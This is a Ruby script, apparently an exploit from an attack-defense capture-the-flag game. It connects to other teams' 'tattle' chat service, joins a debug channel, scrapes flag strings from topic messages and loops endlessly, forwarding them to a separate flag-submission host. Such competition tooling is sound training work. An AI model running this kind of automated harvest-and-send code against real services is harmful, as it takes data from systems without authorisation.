#!/usr/bin/env ruby
require 'socket'
require 'timeout'
require 'yaml'

#########################################
#
#   сервис: tattle
#    порты: 62882
# алгоритм:
#
#########################################

TARGET_PORT = 62882

OUR_HOST = '10.12.21.6'
FLAG_RE  = /^[a-f0-9]{16}$/i

# координаты нашей постилки флагов
POST_FLAGS_HOST = "10.12.21.21"
POST_FLAGS_PORT = 12321

#########################################

STDOUT.sync = true

raise "gimme an arg" if ARGV.empty?

@host  = ARGV.first
@ids   = {}
@flags = []

raise "don't attack self!" if @host == OUR_HOST

def _submit_flags
  socket = TCPSocket.new POST_FLAGS_HOST, POST_FLAGS_PORT
  socket.puts "id=tattle"
  socket.gets
  socket.puts @flags.join("\n")
  socket.flush
  socket.close
  @flags = []
end

def submit_flags
  Timeout.timeout(60){ _submit_flags }
rescue
  puts "[!] #{__method__}: #{$!}"
end

def gen_random_name
  s = (0..9).to_a.join + ('a'..'z').to_a.join + ('A'..'Z').to_a.join
  12.times.map{ s[rand(s.size)] }.join
end

def join_chat
  socket = TCPSocket.new @host, TARGET_PORT
  puts "[.] connected to #@host:#{TARGET_PORT}"
  socket.puts gen_random_name
  socket.puts "/join debug"
  while true do
    line = socket.gets
    line.strip!
    if line[/Topic of \w+ set to ([a-fA-F0-9]{16})\e/] || line[/Latest Topic: ([a-fA-F0-9]{16})\e/]
      puts $1
      @flags << $1
    end
    submit_flags if @flags.any?
  end
rescue
  puts "[!] #{__method__}: #{$!}"
end

while true do
  join_chat
  submit_flags if @flags.any?
  sleep 10
end
